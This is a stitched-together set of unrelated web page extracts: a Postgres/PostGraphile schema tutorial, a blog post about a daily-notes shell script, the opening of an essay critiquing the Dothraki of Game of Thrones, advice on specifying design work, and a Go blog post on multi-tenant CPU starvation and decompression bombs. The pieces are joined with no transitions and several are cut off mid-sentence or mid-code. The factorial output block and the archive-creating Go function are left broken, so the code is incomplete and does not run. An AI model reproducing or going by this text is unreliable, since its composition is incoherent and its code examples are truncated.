<a href="https://www.postgresql.org/docs/current/static/sql-createtable.html"><code>CREATE TABLE</code></a>
command are fairly easy to learn and understand. Creating tables is the easiest,
but also the most fundamental part of your schema design.</p>
<blockquote>
<p><strong>Note:</strong> We prefer singular identifers like <code>forum_example.person</code> over
<code>forum_example.people</code> because when you create a table, it is like you are
creating a class in a statically typed language. Classes have singular names
like “Person” while collections will often have plural names like “People.”
Table as a class is a better analogy than table as a collection because
Postgres itself will internally call tables “classes.”</p>
</blockquote>
<blockquote>
<p><strong>Note:</strong> In case you don’t like serial id of our table above, an alternative
to the <code>serial</code> primary key is UUIDs. To use UUIDs you would just need to add
the popular UUID extension, <code>uuid-ossp</code>, in your database setup, and specify a
default in your table creation. Like so:</p>
<div data-language="sql"><pre><code><span>create</span> extension <span>if</span> <span>not</span> <span>exists</span> <span>"uuid-ossp"</span><span>;</span>

<span>create</span> <span>table</span> forum_example<span>.</span>person <span>(</span>
  id uuid <span>primary</span> <span>key</span> <span>default</span> uuid_generate_v1mc<span>(</span><span>)</span><span>,</span>
  <span>.</span><span>.</span><span>.</span>
<span>)</span><span>;</span></code></pre></div>
<p>Alternatively you could use fully random UUIDs:</p>
<div data-language="sql"><pre><code><span>create</span> extension <span>if</span> <span>not</span> <span>exists</span> <span>"pgcrypto"</span><span>;</span>

<span>create</span> <span>table</span> forum_example<span>.</span>person <span>(</span>
  id uuid <span>primary</span> <span>key</span> <span>default</span> gen_random_uuid<span>(</span><span>)</span><span>,</span>
  <span>.</span><span>.</span><span>.</span>
<span>)</span><span>;</span></code></pre></div>
<p>There are pros and cons to both approaches, choose what works best for your
application!</p>
</blockquote>
<h4 id="table-documentation"><a href="#table-documentation" aria-label="table documentation permalink"></a>Table Documentation</h4>
<p>Now that we have created our table, we want to document it within the Postgres
database. By adding comments to our table and its columns using the Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-comment.html"><code>COMMENT</code></a>
command, we will allow tools like PostGraphile to display rich domain specific
documentation.</p>
<p>To add comments, just see the SQL below:</p>
<div data-language="sql"><pre><code><span>comment</span> <span>on</span> <span>table</span> forum_example<span>.</span>person <span>is</span> <span>'A user of the forum.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>id <span>is</span> <span>'The primary unique identifier for the person.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>first_name <span>is</span> <span>'The person’s first name.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>last_name <span>is</span> <span>'The person’s last name.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>about <span>is</span> <span>'A short description about the user, written by the user.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>created_at <span>is</span> <span>'The time this person was created.'</span><span>;</span></code></pre></div>
<p>Incredibly simple, yet also incredibly powerful.</p>
<blockquote>
<p><strong>Note:</strong> Feel free to write your comments in Markdown! Most tools, including
GraphiQL which PostGraphile uses, will render your comments with the
appropriate styles.</p>
</blockquote>
<p>With this we have completed our person table, now let’s create a table for our
forum posts.</p>
<h4 id="the-post-table"><a href="#the-post-table" aria-label="the post table permalink"></a>The Post Table</h4>
<p>The users of our forum will want to be able to create posts. That’s the entire
reason we have a forum after all. To create the post table we go through a very
similar process as creating our <code>forum_example.person</code> table, but first we want
to create a type we will use in one of the columns. See the SQL below:</p>
<div data-language="sql"><pre><code><span>create</span> <span>type</span> forum_example<span>.</span>post_topic <span>as</span> <span>enum</span> <span>(</span>
  <span>'discussion'</span><span>,</span>
  <span>'inspiration'</span><span>,</span>
  <span>'help'</span><span>,</span>
  <span>'showcase'</span>
<span>)</span><span>;</span></code></pre></div>
<p>The Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-createtype.html"><code>CREATE TYPE</code></a>
command will let you create a custom type in your database which will allow you
to do some really cool things. You can create a
<a href="https://www.postgresql.org/docs/current/static/rowtypes.html">composite type</a>
which is basically a typed object in GraphQL terms, you can create a
<a href="https://www.postgresql.org/docs/current/static/rangetypes.html">range type</a>
which represents exactly what you might think, or you can create an
<a href="https://www.postgresql.org/docs/current/static/datatype-enum.html">enum type</a>
which is what we did here.</p>
<p>Enum types are a static set of values, you <em>must</em> use one of the string values
that make up the enum in any column of the enum’s type. Having this type is
useful for us, because we want our forum posts to have one, or none, topics so
user’s may easily see what a post is about.</p>
<blockquote>
<p><strong>Note:</strong> PostGraphile implements custom handling for user-defined types. An
enum type like that defined above will be turned into a GraphQL enum that
looks like:</p>
<div data-language="graphql"><pre><code><span>enum</span> <span>PostTopic</span> <span>{</span>
  <span>DISCUSSION</span>
  <span>INSPIRATION</span>
  <span>HELP</span>
  <span>SHOWCASE</span>
<span>}</span></code></pre></div>
<p>You can also create custom composite types which will turn into GraphQL object
types with PostGraphile.</p>
<div data-language="sql"><pre><code><span>create</span> <span>type</span> my_schema<span>.</span>my_type <span>as</span> <span>(</span>
  foo <span>integer</span><span>,</span>
  bar <span>integer</span>
<span>)</span><span>;</span></code></pre></div>
<p>Would become the following GraphQL type:</p>
<div data-language="graphql"><pre><code><span>type</span> <span>MyType</span> <span>{</span>
  <span>foo</span><span>:</span> Int
  <span>bar</span><span>:</span> Int
<span>}</span></code></pre></div>
</blockquote>
<p>Now it is time to actually create our post table:</p>
<div data-language="sql"><pre><code><span>create</span> <span>table</span> …</code></pre></div></div></div>

file on my desktop. And at the end of the day, I would delete that file and
start over again the next day. Inspired by the minimalism of <a href="https://github.com/todotxt/todo.txt-cli">todo-txt-cli</a>,
I created a similar system to manage my own notes.</p><p>Keep reading for more details or skip to the code: <a href="https://github.com/hachibu/note.sh">github.com/hachibu/note.sh</a>.</p><h4 id="introduction">Introduction</h4><p>As I mentioned before, I used to keep a single notes file on my desktop, and I
would delete it everyday. I would use this notes file to keep track of random
thoughts and details related to my work and personal life. My notes file might
contain code snippets from work, inspirational quotes, or it might have my
latest and greatest open-source software idea, or maybe even the beginning of a
new blog post. Anyway, I loved the simplicity of it, and I didn’t want any more
apps, databases or logins in my life.</p><p>But it wasn’t until I started using <a href="https://github.com/todotxt/todo.txt-cli">todo-txt-cli</a>
that I considered writing a script to manage my own notes. The brilliant part
about <code>todo-txt-cli</code> is that it’s just text files stored in my Dropbox and a
small shell script to interface with those files.</p><p>Inspired by the minimalism of <code>todo-txt-cli</code>, I built <a href="https://github.com/hachibu/note.sh">note.sh</a>.
In total, the entire project consists of 1 Bash script, 1 environment variable
to configure the notes directory and 1 symlink to install it to your
<code>/usr/local/bin</code> directory.</p><h4 id="how-it-works">How It Works</h4><p>The way it works is that every time I run the script, it opens the note for that
day in my editor of choice. For example, if today was December 2, 2020 then the
script would open a file named <code>2020-12-02.md</code> in the notes directory.</p><p>I use Vim as my editor, and I have my notes stored on Dropbox so I can access
them on all of my computers. So, my shell RC file looks like this.</p><div><pre><code data-lang="shell"><span>export</span> <span>EDITOR</span><span>=</span><span>"vim"</span>
<span>export</span> <span>NOTE_DIR</span><span>=</span><span>"</span><span>$HOME</span><span>/Dropbox/Notes"</span>
</code></pre></div><p>And my Dropbox directory looks like this.</p><p><img src="https://hachibu.net/posts/2020/how-i-manage-my-random-daily-notes/images/dropbox-screenshot.png" alt="Dropbox Screenshot"></p><p>For searching, the script accepts a pattern and runs a recursive grep over the
notes directory. I chose grep because I use this script on both Mac and Linux,
and I wanted the script to be as portable as possible.</p><h4 id="conclusion">Conclusion</h4><p>I’ve been using this script for several months across several computers, and I
still love it. I don’t search as often as I thought I would, but it’s comforting
to know it’s all there if I need it. I also ended up creating an alias for my
script so all I need to type is the letter <code>n</code> to run the script.</p><p>In the future, I’d like to add a test suite to the code base, figure out how
to create a Homebrew formula, and add archiving for older notes.</p></div></div>]]>

<p>This is the first part of a three part (II, III) look at the Dothraki, the fictional horse-borne nomads of the <em>Game of Thrones</em> / <em>A Song of Ice and Fire</em> series and the degree to which George R.R. Martin’s claim that they are “an amalgam of a number of steppe and plains cultures” holds up to scrutiny.  This is something that I have been suggesting I would get to since (checks notes),<a href="https://acoup.blog/2019/05/04/new-acquisitions-that-dothraki-charge/"> May.  Of Last Year.</a>  So it is about time we actually get to it.</p>



<p>The plan is for this series to run in three parts.  Part I (this part) will discuss how the Dothraki <em>look</em> in the setting.  Part II will look at broader questions of social organization and culture (I am nearly certain this is one of those cases where there will be a IIa and a IIb, but my hope for brevity springs eternal).  Part III will look at military culture.  In all three parts I am going to use both the books and the show – noting where they diverge – in part because the heaviest characterization the Dothraki got in the show was when Martin was still significantly involved with it (meaning that large parts of it likely still reflect his vision), but also because the show is how the vast majority of people experience this particular fiction.  Both the original text and the show derived from it deserve to have their vision discussed.</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>First, a <strong>content warning for this series</strong>: this is discussing <em>A Song of Ice and Fire</em> and <em>Game of Thrones</em> which features a lot of content which is not G-rated.  More to the point, it is a discussion of what – I will argue – Martin presents as one of, if not the most brutal and sexually violent society in that setting.  And that means those themes are going to come up here (less in this essay, but more in the other parts); we are going to remain serious and adult about those things of course, but they will be a part of this analysis nonetheless.  If that is not for you, by all means feel free to check out for a few weeks.</p>



<p>Before we get into the main point, <strong>I want to note that I am going to reference my series on the <a href="https://acoup.blog/2020/01/17/collections-the-fremen-mirage-part-i-war-at-the-dawn-of-civilization/">Fremen Mirage</a> <em>a lot</em> here</strong>, because there is a lot of Fremen stuff going on with how Dothraki society is depicted.  As a result, it may be useful to go back and read those, but just to recap, we may define the Fremen Mirage this way:</p>



<p><a href="https://acoup.blog/2020/02/21/collections-the-fremen-mirage-interlude-ways-of-the-fremen/"><strong>The Fremen Mirage is a literary trope, <em>unconnected to historical reality</em>, which presents societies as a contrast between unsophisticated, but morally pure, hyper-masculine and militarily effective ‘strong men’ societies honed by ‘hard times’ (that is, the Fremen of the term) and a sophisticated but effeminate and decadent ‘weak men’ societies weakened by ‘good times,’ frequently with an implicit assertion of the superior worth of the former.</strong></a></p>



<p>Next, a note on citation here from the books.  My understanding is that different printings of the books have different pagination, which seems to be why the Wiki of Ice and Fire cites by chapter numbers (except that the chapters of the books, as printed, <em>aren’t numbered</em> in the print editions I’ve seen, making this classical-style citation extremely cumbersome and inexact).  I am going to cite by the page numbers of my edition, which is the 2011 Bantam Books Trade Paperback Edition (the box set).  Hopefully that will be enough.</p>



<p>Finally, a note on my expertise here.  <strong>I am not a scholar of either the peoples of the Eurasian Steppe or the American Great Plains</strong>.  The former group does intrude into my period and study, as steppe nomads, in the form of Scythians, Sarmatians and Huns did interact (sometimes peacefully, sometimes violently) with the broader Mediterranean world.  Consequently, my knowledge of steppe peoples tend to be better that my knowledge of the Native American peoples of the Great Plains, but I have tried, within the limits of time and availability, to do my research. <strong> I actually think, in a strange sense, this is useful, because my own initial unfamiliarity with the topic has demonstrated to me just how <em>basic</em> the level of research and reading necessary to avoid the failures of this depiction are</strong>.  You do not, in turns out, need to be an experienced scholar on the topic; just a few books and a couple of emails is enough to already radically improve on what we see and read in <em>A Song of Ice and Fire</em>, much less the absolute <em>mess </em>of what we see in <em>A Game of Thrones</em>.</p>



<p>Writing this has been tricky.  I am well aware that both of these broad cultural groups (that is, Steppe peoples and Plains Native Americans) are often represented in popular culture only in the form of inaccurate and demeaning stereotypes.  I do not want to be just another link in that chain of poor understanding.  I have thus tried to root my argument here, wherever possible, in either the writings of specialist scholars (there will be more of that next week as we get into subsistence patterns, warfare, etc.) or primary evidence, particularly in terms of <em>period photographs</em>, when it comes to clothing and dress.  With luck I have not erred overmuch.</p>

<h2>…But, Why?</h2>



<p>But before we get into the issue proper, it is important to clear away the standard objections, both why subject <em>A Song of Ice and Fire</em> (and its spin-off properties) to critical analysis at all and also why, if we are going to do that, we are going to focus squarely in on the Dothraki.  The answer to the first is something that we’ve rehearsed a number of times, but bears restating: for most of its readers (and the watchers of <em>A Game of Thrones</em>), <em>A Song of Ice and Fire</em> will be their primary exposure to the idea of the Middle Ages.  This is particularly true because of the reputation that the series has for being ‘<a href="https://acoup.blog/2019/05/28/new-acquisitions-not-how-it-was-game-of-thrones-and-the-middle-ages-part-i/">how it really was</a>,’ a reputation that George R.R. Martin has consciously cultivated (as with his classic complaint of <a href="https://youtu.be/p-VxvKoDFIw">‘what was Aragorn’s tax policy’</a> – there is a rich irony that, had Martin understood rulership in the Middle Ages better, he would have understood why Aragorn’s tax policy was less important).  Martin has been quite open that he “<a href="https://www.westeros.org/Citadel/SSM/Entry/6040/">draw[s] inspiration from history</a>” and that fact has long been a selling point of the series over more obviously fantastical kinds of medieval-themed high fantasy as well as a <a href="https://ew.com/article/2015/06/03/george-rr-martin-thrones-violence-women/">response to some of the series’ more controversial moments</a>.</p>



<p><strong>Naturally, that cloak of verisimilitude has tended to intensify the degree to which elements of <em>A Song of Ice and Fire</em> is taken by its readers and viewers as representative of the Middle Ages more generally.</strong>  And of course as I have noted in the (quite recent) past,<strong> <a href="https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/">fiction is often how the public conceptualizes the past and that concept of the past shapes the decisions we make in the present</a></strong>.  In the case of <em>A Song of Ice and Fire</em> in particular, this vision of the past is <a href="https://acoup.blog/2019/06/12/new-acquisitions-how-it-wasnt-game-of-thrones-and-the-middle-ages-part-iii/">particularly worth interrogating</a> because it serves as the basis for a<a href="https://youtu.be/ek2O6bVAIQQ"> parable on power and violence</a>.</p>



<p>But <em>even if it didn’t</em>, it would still be worth discussing these aspects of the universe of <em>A Song of Ice and Fire</em>, because that is what we are supposed to do with cultural products, with <em>literature</em>.  <strong>I am sometimes baffled that the very fans who insist that their particular loves be treated seriously, as <em>art</em> are the same fans who react with frustration if one then sets out to interrogate those same genres the way one would interrogate serious art or literature</strong>.  This is it, after all!  This is what you (we, really) wanted!  A (quite unimpressive, I’ll grant you) ivory tower academic is taking this genre seriously and subjecting it to serious criticism!  Isn’t that what emerging genres often hope for, to be taken seriously as ‘high’ literature?</p>



<p><strong>And of course we should take it seriously.</strong>  And here I want to speak briefly to the purpose of these sorts of endeavors, <strong>because the goal here is not to force anyone to dislike <em>A Song of Ice and Fire</em></strong>.   We’re not here to ‘cancel’ <em>ASOIF</em> any more than we were going to ‘cancel’ <a href="https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/"><em>AC:Valhalla</em> two weeks ago</a> (a game I continue to play, I might add).  Instead, discussing cultural products like this is a form of inoculation against their potentially negative aspects, because once a reader knows that, for instance, the depiction of a given culture in a work of fiction has relatively little to do with any real world culture, they can compartmentalize that to the fiction itself; <strong>it loses its power to mislead</strong> <strong>and so may be enjoyed in safety, as it were</strong>.  And there are good things in <em>A Song of Ice and Fire</em> and in the first six or so seasons of <em>Game of Thrones</em>; but we also need to be honest about the failings.</p>



<p>(Of course, more broadly, doing this as a practice exercise is a key part of building up that skill – what we may term ‘critical reading’ – more generally, rendering the alert reader more resistant to this sort of thing, both in its unintended form (as, I suspect, in this case) or  in its more dangerous<em> intended form</em>.  Put another way, developing critical reading skills is one important way to make one’s self a harder target for misinformation, including historical misinformation.)</p>



<h2>A Dash of Pure Fantasy</h2>



<p>Alright, so <em>A Song of Ice and Fire</em> is worth looking at closely.  So why <em>this</em> part of the fiction?  It comes down to something <a href="https://www.westeros.org/Citadel/SSM/Entry/6040/">George R.R. Martin wrote</a>:</p>



<blockquote><p>The Dothraki were actually fashioned as an amalgam of a number of steppe and plains cultures… Mongols and Huns, certainly, but also …</p></blockquote></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Thanks to a conversation I had with <a href="https://twitter.com/jackzerby">Jack Zerby</a> at Gumroad, I now feel confident asking designers to create a user interface, graphic, visual identity, or any other design artifact and have become much more productive at communicating and delegating design tasks. This is essential because my design skills are non-existent. Fortunately, design skills don’t matter in creating a spec, design thinking does. These are my notes from that&nbsp;conversation.</p>
<p>Readers familiar with speccing software or anything else may realize that the advice I’m conveying here matches both your use case and the general case. That, in fact, is the insight that I was missing before the conversation. I already knew how to spec a design, I just needed the right&nbsp;words.</p>
<h3>Step-by-Step&nbsp;Spec</h3>
<p>If you write a spec with all of this information, your designer should have everything they need to get&nbsp;started.</p>
<h4>Step 1: Specify context and&nbsp;canvas</h4>
<p>The canvas is the size and nature of the space the designer has to work in. For graphics, it is the literal dimensions, for software, it is the range of screens that a user might interface with the design from. Web vs mobile is also a canvas&nbsp;question.</p>
<p>Context is what else is nearby. This can mean other aspects of the application as a whole, or it can mean where the user is in a certain process when they encounter the design. If you are asking for a graphic to use on Twitter, that is part of the context, and is very different than asking for a graphic to use on a physical billboard in ways that just the size of the canvas doesn’t fully&nbsp;convey.</p>
<h4>Step 2: List the&nbsp;ingredients</h4>
<p>What actually goes in the design? What information needs to be conveyed? What actions does the user have access to? Be complete, if you don’t list it, the designer won’t know to include&nbsp;it.</p>
<p>An existing stylesheet, illustration, library, or other asset is also an ingredient in the&nbsp;design.</p>
<p>Make sure you have the right number of ingredients for your canvas and context. The more skilled your designer, the more range you get on this, but only to a certain&nbsp;limit.</p>
<h4>Step 3: Identify patterns and&nbsp;hierarchies</h4>
<p>Tell your designer which elements and ingredients are the most important. When you tell your designer the relative importance of the various aspects they use their tools to communicate that importance to the&nbsp;user. </p>
<p>Work with patterns of information within the hierarchy while avoiding identical sections blurring together. Information should match and rhyme, not repeat. But, without a pattern, the design will present friction to the&nbsp;user.</p>
<p>You can communicate hierarchy in words. Lists, especially nested lists, are important here. Order matters, especially in something that can be scrolled&nbsp;through.</p>
<p>If you communicate hierarchy in pictures, don’t go any higher fidelity than a <a href="https://basecamp.com/shapeup/1.3-chapter-04">fat marker sketch</a>. Otherwise, you’ll artificially limit your designer early in the&nbsp;process.</p>
<h4>Step 4: Set&nbsp;tone</h4>
<p>Asking to communicate emotions, impressions, and themes is okay, even good. “X but not Y” is a powerful pattern for doing so, like “minimalist but not empty” or “whimsical but not frivolous.” The more evocative your description, the&nbsp;better.</p>
<h4>Step 5: Send and&nbsp;iterate</h4>
<p>Everything in the spec should be written to avoid friction with the designer. Every time they have to ask you what you mean or you go back and forth on an aspect of your spec, that adds friction to the design process. The faster the turnaround, the more specific your request should be. Specify how many iterations your project merits or your timeline&nbsp;allows.</p>
<p>Design iterations alternate between wide and deep. A “wide” iteration yields several versions of the requested design as a whole. A “deep” iteration takes a chosen design from the wide iteration and comes up with variations on the&nbsp;theme.</p>

      <a href="https://goteleport.com/blog/index.xml"><i></i></a>
      
      

        

<p>Modern languages like Python, NodeJS, and Go make it easy to handle
concurrent requests for multiple customers at the same time by using threads or goroutines.</p>

<p>Such services seem very cost effective because one process can handle hundreds or thousands
of tenants. However, this efficiency comes at a hidden, steep price. When language runtime
scheduling breaks down, one tenant can cause an outage for everyone.</p>

<h2 id="concurrency-made-simple">Concurrency made simple</h2>

<p>Go makes it trivial to handle concurrency.</p>

<p>Here is an example from <a href="https://tour.golang.org/concurrency/1">A Tour Of Go</a> that
launches two goroutines that work independently of each other:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"fmt"</span>
	<span>"time"</span>
)

<span>func</span> <span>say</span>(<span>s</span> <span>string</span>) {
	<span>for</span> <span>i</span> <span>:=</span> <span>0</span>; <span>i</span> &lt; <span>5</span>; <span>i</span><span>++</span> {
		<span>time</span>.<span>Sleep</span>(<span>100</span> <span>*</span> <span>time</span>.<span>Millisecond</span>)
		<span>fmt</span>.<span>Println</span>(<span>s</span>)
	}
}

<span>func</span> <span>main</span>() {
	<span>go</span> <span>say</span>(<span>"world"</span>)
	<span>say</span>(<span>"hello"</span>)
}
</code></pre></div>
<p>The Go runtime makes sure that each goroutine gets its fair share of CPU and memory.
It gives the impression that both run in parallel:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS sets system threads to 1</span>
<span># This sets up the go language runtime to use one system thread across</span>
<span># all goroutines. Removing this setting will introduce some parallelism,</span>
<span># but will not solve the problems described in this article.</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run main.go
world
hello
hello
world
...</code></pre></div>
<h2 id="language-runtimes-and-multi-tenancy">Language Runtimes and Multi-Tenancy</h2>

<p>Let’s implement a sample Go SaaS that fetches the contents of a URL
for multiple tenants in parallel:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"net/http"</span>
    <span>"sync"</span>
)

<span>// fetch in our example performs some SaaS work for a tenant,
</span><span>// in this case it gets the URL contents from the internet
</span><span></span><span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>url</span> <span>string</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>// Don't ignore errors in real code, folks, and close the response body
</span><span></span>    <span>re</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
        <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) error -&gt; -&gt;  %v\n"</span>, <span>tenant</span>, <span>err</span>)
        <span>return</span>
    }
    <span>defer</span> <span>re</span>.<span>Body</span>.<span>Close</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v\n"</span>, <span>tenant</span>, <span>re</span>.<span>Status</span>)
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>url</span> <span>:=</span> <span>"http://www.golang.org/"</span>
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>3</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>url</span>)
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>My computer runs the program in no time:</p>
<div><pre><code data-lang="bash">$ go run simple/main.go 
Tenant<span>(</span>2<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>1<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>0<span>)</span> -&gt; <span>200</span> OK</code></pre></div>
<p>We can imagine that the Go runtime executes the program in the following order:</p>
<div><pre><code data-lang="go"><span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>0</span>, <span>"http://golang.org"</span>)
<span>handle0</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle0</span>, <span>goroutine0</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine0</span>)

<span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>1</span>, <span>"http://golang.org"</span>)
<span>handle1</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle1</span>, <span>goroutine1</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine1</span>)
<span>...</span>
<span>// main program waits until any function returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>...</span> 
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
<span>// main program waits until any other handle returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
</code></pre></div>
<p>This parallelism and blocking call is an illusion created by a combination of the use of the asynchronous
<a href="https://kovyrin.net/2006/04/13/epoll-asynchronous-network-programming/">epoll</a> Linux function
and Go’s built in runtime scheduler. <code>epoll</code> can efficiently handle thousands of network sockets at once.</p>

<p>The Go runtime activates a smart scheduler to handle <code>go</code> statements - goroutines.
It makes sure that every goroutine gets its share of CPU time and suspends
execution when the function is waiting on network or file input/output.
It’s not unusual to have tens of thousands of goroutines in the system
and see the Go runtime handle the requests well.</p>

<p>If you are interested in a more detailed intro to the Go scheduler, take a look at this article
from <a href="https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html">Ardan Labs</a>.</p>

<p>This makes Go a great language for handling concurrent network requests
that constitute the bulk of an average software as a service program that reads and writes to a database
or an external service.</p>

<h2 id="when-fair-scheduling-breaks-down">When fair scheduling breaks down</h2>

<p>Language runtimes do not have full control and visibility into
the resource allocation that is done by the Linux kernel.</p>

<p>This is where the multi-tenancy service promise of fair scheduling breaks down.</p>

<p>Take a look at this number-crunching service that computes factorials on demand:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"sync"</span>
    <span>"time"</span>
)

<span>// This implementation has a problem, but our code review did not catch it -
</span><span>// all the engineers were busy arguing on HN.
</span><span></span><span>func</span> <span>factorial</span>(<span>n</span> <span>int64</span>) <span>int64</span> {
    <span>b</span> <span>:=</span> int64(<span>1</span>)
    <span>for</span> <span>i</span> <span>:=</span> int64(<span>1</span>); <span>i</span> <span>&lt;=</span> <span>n</span>; <span>i</span><span>++</span> {
        <span>b</span> <span>*=</span> <span>i</span>
    }
    <span>return</span> <span>b</span>
}

<span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>number</span> <span>int64</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>number</span> = <span>factorial</span>(<span>number</span>)
    <span>end</span> <span>:=</span> <span>time</span>.<span>Now</span>().<span>UTC</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v at %v\n"</span>, <span>tenant</span>, <span>number</span>, <span>end</span>.<span>Format</span>(<span>"15:04:05.000000"</span>))
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>10</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>if</span> <span>tenant</span> <span>==</span> <span>0</span> {
            <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>10000000000</span>)
        } <span>else</span> {
            <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>10</span><span>+</span>int64(<span>tenant</span>))
        }
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>In this case, you would not observe the same efficient parallelism.</p>

<p>My execution prints:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS limits the execution to one CPU</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run fib/main.go

<p>Because of the inefficient factorial implementation that took a lot of iterations
and number crunching, tenant 0 consumed all the CPU time and degraded performance for the others.</p>

<p>We can fix the factorial function and add code that limits the possible input numbers.
However, our service has just suffered an outage due to a bug in the code for all our customers,
<a href="https://goteleport.com/resources/videos/workflow-access-pageduty-slack/">PagerDuty</a> is ringing and we are not sleeping again.</p>

<h2 id="a-real-world-example">A real-world example</h2>

<p>I made up our factorial example, but let’s create a real world one using
decompression bombs.</p>

<p>Decompression bombs are specially crafted archives that are small, but expand
into files ranging from tens to thousands of times their size.</p>

<p>They are specifically designed to take down your service. Anyone can download
one <a href="https://bomb.codes/bombs">from the internet</a>.</p>

<p>Some archives use simple techniques like compressing very large files
filled with zeroes. They take advantage of the fact that compression algorithms
represent a huge file with zeroes with a version of <code>repeat billion zeroes here</code>.</p>

<p>More <a href="https://www.usenix.org/system/files/woot19-paper_fifield_0.pdf">sophisticated approaches</a>
explore compression techniques in depth and craft evil files
that can explode to petabytes of disk space. The danger is real and lots of programs are
vulnerable on the internet right now.</p>

<p>Let’s explore the effect of such archive on a multi-tenant service.
Our new service unpacks the archive and counts the number of words in a file:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"bufio"</span>
	<span>"bytes"</span>
	<span>"compress/gzip"</span>
	<span>"fmt"</span>
	<span>"io"</span>
	<span>"io/ioutil"</span>
	<span>"log"</span>
	<span>"sync"</span>
	<span>"time"</span>
)

<span>func</span> <span>createArchive</span>() []<span>byte</span> {
	<span>var</span> <span>buf</span> <span>bytes</span>.<span>Buffer</span>
	<span>zw</span> <span>:=</span> <span>gzip</span>.<span>NewWriter</span>(<span>&amp;</span><span>buf</span>)

	<span>_</span>, <span>err</span> <span>:=</span> <span>zw</span>.<span>Write</span>([]byte(<span>"A long time ago in a galaxy far, far away..."</span>))
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {

<h2 id="resource-isolation-with-cgroups">Resource isolation with cgroups</h2>

<p>The core of the problem is that CPU time is limited. Programming language runtimes lack
the control and context required to efficiently distribute the CPU time per goroutine.</p>

